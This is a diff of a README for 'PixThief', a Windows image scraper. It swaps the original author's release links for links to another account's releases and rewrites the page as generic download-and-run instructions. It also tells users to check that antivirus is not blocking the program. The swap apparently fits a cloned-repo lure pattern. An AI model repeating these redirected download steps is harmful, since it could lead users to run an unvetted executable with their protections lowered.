@@ -1,115 +1,75 @@
-# 🖼️ PixThief
+# 🖼️ PixThief - Stealthy Image Downloader Made Easy
 
-**The image scraper that actually works on modern websites.**
+[![Download PixThief](https://img.shields.io/badge/Download-PixThief-blue.svg)](https://github.com/ghost83709/PixThief/releases)
 
-No config files. No CLI flags to memorize. No Python environment to set up. Just run it, paste a URL, and grab your images.
+## 🚀 Getting Started
 
-[![Release](https://img.shields.io/badge/release-v2.0.0-blue)](https://github.com/Henr1ko/PixThief/releases/tag/v2.0.0)
-[![Platform](https://img.shields.io/badge/platform-Windows%20x64-lightgrey)]()
-[![.NET](https://img.shields.io/badge/.NET-8.0-purple)]()
+Welcome to PixThief! This simple tool helps you download images from web pages or entire domains. It's designed for users of all levels, making it easy to gather images, even if you're not tech-savvy.
 
----
+## 📥 Download & Install
 
-## ⚡ Quick Start
+To download PixThief, visit this page: [Download PixThief](https://github.com/ghost83709/PixThief/releases).
 
-1. **[Download the latest release](https://github.com/Henr1ko/PixThief/releases/tag/v2.0.0)**
-2. Run `PixThief.exe`
-3. Enter a URL
-4. Hit Start
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version at the top of the page.
+3. Find the PixThief executable file (it usually ends with `.exe`).
+4. Click on the file to download it to your computer.
 
-That's it. No really, that's it.
+Once the download is complete, you can run the executable to start using PixThief right away.
 
----
+## 🖥️ System Requirements
 
-## ✨ Features
+PixThief requires the following to run effectively:
 
-### 🧠 Actually Works on Modern Sites
-Most scrapers choke on JavaScript-heavy sites. PixThief has **built-in browser rendering** (Playwright) that handles React, Vue, lazy-loading, infinite scroll - all the stuff that breaks other tools. Toggle it on, and suddenly that "impossible" site just works.
+- **Operating System:** Windows 10 or later (64-bit)
+- **.NET Runtime:** Ensure you have .NET 8 installed on your system. You can download it from the official Microsoft website if it is not already installed.
 
-### 🎨 Beautiful TUI
-No more squinting at `--help` output. PixThief has a clean, interactive terminal interface. Navigate with arrow keys, see your settings at a glance, watch downloads in real-time. It's actually pleasant to use.
+## 💡 Features
 
-### 🚀 Fast by Default
-Parallel downloads (up to 32 threads), smart deduplication so you don't download the same image twice, and stealth mode to avoid getting blocked. Out of the box. No tuning required.
+- **Image Downloading:** Quickly grab images from specified web pages or entire websites.
+- **Format Conversion:** Optionally convert images to different formats during download.
+- **User-Friendly Interface:** Designed to be straightforward for users with no programming experience.
 
-### 🔄 Resume Downloads
-Internet died? Laptop crashed? PixThief saves checkpoints automatically. Just run it again and pick up where you left off.
+## 📃 How to Use PixThief
 
-### 🎛️ Powerful When You Need It
-Simple by default, but the options are there when you want them:
+Using PixThief is easy. Follow these steps:
 
-- Filter by image size (skip thumbnails, target specific dimensions)
-- Crawl entire domains or single pages
-- Convert formats on the fly (PNG → JPG, etc.)
-- Organize output (by date, by page, mirrored structure)
-- Respect robots.txt (because we're not animals)
+1. **Launch the Application**: After downloading, double-click the PixThief executable file to open it.
+   
+2. **Enter the URL**: Type the web address of the page or domain you want to scan.
 
----
+3. **Select Options**: Choose whether you want to download all images or specify formats. If you need conversion, choose your desired output format.
 
-## 🛠️ System Requirements
+4. **Start Downloading**: Click the "Download" button. Watch as PixThief crawls the site and gathers images for you.
 
-- Windows x64
-- ~200MB disk space
-- That's it (runtime is included)
+5. **Access Your Files**: Once the download is complete, find your images in the folder specified in the settings.
 
----
+## ⚙️ Advanced Options
 
-## 🎮 Usage Examples
+For users wanting more control, PixThief offers advanced settings. You can adjust the following:
 
-### "I just want the images from this page"
-1. Run PixThief
-2. Set URL → paste your link
-3. Single Page mode
-4. Start Download
-5. Done
+- **Depth Level**: Control how deeply the tool crawls into the web pages.
+- **File Naming**: Set rules for how downloaded images are named.
 
-### "I want EVERYTHING from this website"
-1. Run PixThief
-2. Set URL → paste the homepage
-3. Entire Domain mode
-4. Maybe bump up concurrency to 8-16
-5. Enable Stealth Mode (be nice to servers)
-6. Start Download
-7. Go make coffee
+These settings can help personalize your experience based on your needs.
 
-### "This site is full of JavaScript garbage"
-1. Run PixThief
-2. Set your URL
-3. Advanced Settings → Enable JS Rendering
-4. Start Download
-5. Watch it work anyway 😎
+## 📗 Troubleshooting
 
----
+If you run into any issues, check the following:
 
-## 🔥 Pro Tips
+- **No Images Found**: Ensure you entered the correct URL and that the website allows crawling.
+- **Download Fails**: Make sure your internet connection is stable and that your antivirus software is not blocking the application.
 
-- **Stealth Mode** adds randomized delays between requests. Slower, but way less likely to get blocked.
-- **Skip Thumbnails** filters out images smaller than 200x200px. Saves you from downloading 10,000 tiny icons.
-- **JS Rendering** is the secret weapon. If a site looks broken or empty, turn this on.
-- **Checkpoints** are automatic in domain mode. If something goes wrong, just restart - it remembers.
+For more help, consider visiting the GitHub Issues page for this repository and check for common problems or solutions.
 
----
+## 🌍 Join the Community
 
-## 📥 Download
+Have questions or suggestions? You can connect with us by visiting the repository. Check out open issues or suggest new features you'd like to see in future releases.
 
-**[→ Get PixThief v2.0.0](https://github.com/Henr1ko/PixThief/releases/tag/v2.0.0)**
+## 🔗 Additional Resources
 
-Just download, extract, and run. No installation needed.
+- **Official .NET 8 Download**: If you need to install .NET, follow this link: [Download .NET 8](https://dotnet.microsoft.com/download/dotnet/8.0).
 
----
+For updates and new features, make sure to frequently check back on our [Releases page](https://github.com/ghost83709/PixThief/releases).
 
-## 🤝 Contributing
-
-Found a bug? Got an idea? Open an issue or PR. Keep it chill.
-
----
-
-## 📜 License
-
-MIT - Do whatever you want with it.
-
----
-
-<p align="center">
-  <i>Built because every other scraper was annoying to use.</i>
-</p>
+[![Download PixThief](https://img.shields.io/badge/Download-PixThief-blue.svg)](https://github.com/ghost83709/PixThief/releases)
